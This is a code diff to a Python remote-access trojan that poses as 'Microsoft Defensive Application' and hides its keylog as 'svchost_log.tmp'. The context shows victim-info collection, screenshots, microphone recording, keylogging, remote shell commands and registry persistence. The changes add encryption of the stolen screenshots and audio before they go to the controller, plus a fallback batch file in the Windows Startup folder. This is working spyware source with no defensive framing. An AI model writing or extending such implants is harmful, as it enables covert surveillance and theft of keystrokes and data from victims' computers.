@@ -1,6 +1,8 @@
+import base64
 import os
 import sys
 import socket
+import textwrap
 import threading
 import wave
 import platform
@@ -15,7 +17,7 @@ import io
 import shutil
 from enum import StrEnum
 from datetime import datetime
-
+import shlex
 
 is_windows = os.name == "nt"
 
@@ -24,13 +26,16 @@ try:
     import pyscreenshot
     import sounddevice
     import requests
+    import cryptography.fernet as fernet
+
     
 except ModuleNotFoundError:
     required_modules = [
         "pynput",
         "pyscreenshot",
         "sounddevice",
-        "requests"
+        "requests",
+        "cryptography",
     ]
     
     subprocess.run(["pip", "install"] + required_modules, shell=True, capture_output=False)
@@ -43,6 +48,7 @@ PROGRAM_NAME = "Microsoft Defensive Application"
 
 FILE_DIR = os.path.abspath(__file__)
 KEYLOG_PATH  = os.path.join(os.environ["APPDATA"], "svchost_log.tmp")
+STARTUP_FOLDER = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 
 
 curr_dir = os.getcwd()
@@ -66,8 +72,9 @@ class Color(StrEnum):
 
 
 
-def get_banner(type, length, extra):
-    return f"{type}|{length}|{extra}\n"
+def get_banner(type, length, filename, key):
+    key_b64 = base64.b64encode(key).decode() if key else ""
+    return f"{type}|{length}|{filename}|{key_b64}\n"
 
 
 def _timestamp():
@@ -91,14 +98,19 @@ def connect(host, port):
     
 
 def cmd(command):
-    result = subprocess.Popen(
-        command,
-        shell=True,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE, 
-    )
-    output, err = result.communicate()   
-    return output.decode(), err.decode()
+    try:
+        result = subprocess.Popen(
+            shlex.split(command),
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE, 
+        )
+        output, err = result.communicate()   
+        return output.decode(), err.decode()
+    
+    except Exception as e:
+        print(f"{Color.RED}[!] Error executing command: {e}{Color.RESET}")
+        return "", str(e)
 
 
 def copy_to_system():
@@ -141,7 +153,17 @@ def add_to_registry(file_path):
         
     except Exception as e:
         print(f"{Color.RED}[!] Could not register to WinReg{Color.RESET}")
-        return False
+        
+        os.makedirs(STARTUP_FOLDER, exist_ok=True)
+        startup_file = os.path.join(STARTUP_FOLDER, PROGRAM_NAME + ".bat")
+        
+        with open(startup_file, "w") as f:
+            f.write(textwrap.dedent(f"""\
+                @echo off
+                python "{file_path}"
+            """))
+        
+        return True
 
 
 def collect_victim_info():    
@@ -229,9 +251,9 @@ def take_screenshot():
     return filename, buf.getvalue()
     
 
-def send_packet(client: socket.socket , type, filename, data):
+def send_packet(client: socket.socket , type, filename, data, key):
     try:
-        banner = get_banner(type, len(data), filename)
+        banner = get_banner(type, len(data), filename, key)
 
         client.send(banner.encode())
         client.send(data)
@@ -243,7 +265,16 @@ def send_packet(client: socket.socket , type, filename, data):
     
 
 def send_text(client, text):
-    send_packet(client, "TEXT", "none", text.encode())
+    send_packet(client, "TEXT", "none", text.encode(), None)
+
+def encrypt_data(data):
+    key = fernet.Fernet.generate_key()
+
+    cipher_suite = fernet.Fernet(key)
+    encrypted_data = cipher_suite.encrypt(data)
+
+    return key, encrypted_data
+
 
 
 def auto_destroy():
@@ -270,26 +301,30 @@ def main(host, port):
         match command:  
             case "/screenshot":
                 filename, data = take_screenshot()
+                key, encrypted_data = encrypt_data(data)
                 send_packet(
                     client=client, 
                     type="PNG", 
                     filename=filename,
-                    data=data
+                    data=encrypted_data,
+                    key=key
                 )
                 
             case "/audio":
                 audio = listen_audio()
                 filename, data = save_rec(audio)
+                key, encrypted_data = encrypt_data(data)
                 send_packet(
                     client=client,
                     type="WAV",
                     filename=filename,
-                    data=data
+                    data=encrypted_data,
+                    key=key
                 )
 
             case "/keylog":
                 if not keylogger_active:
-                    threading.Thread(target=listen_keyboard, args=(client,), daemon=True).start()
+                    threading.Thread(target=listen_keyboard, args=(client,), daemon=True ).start()
 
             case "/kill":
                 auto_destroy()
@@ -306,7 +341,8 @@ def main(host, port):
                         client=client, 
                         type="CWD", 
                         filename=cwd, 
-                        data=b"ok"
+                        data=b"ok",
+                        key=None
                     )
 
                 except FileNotFoundError | NotADirectoryError:
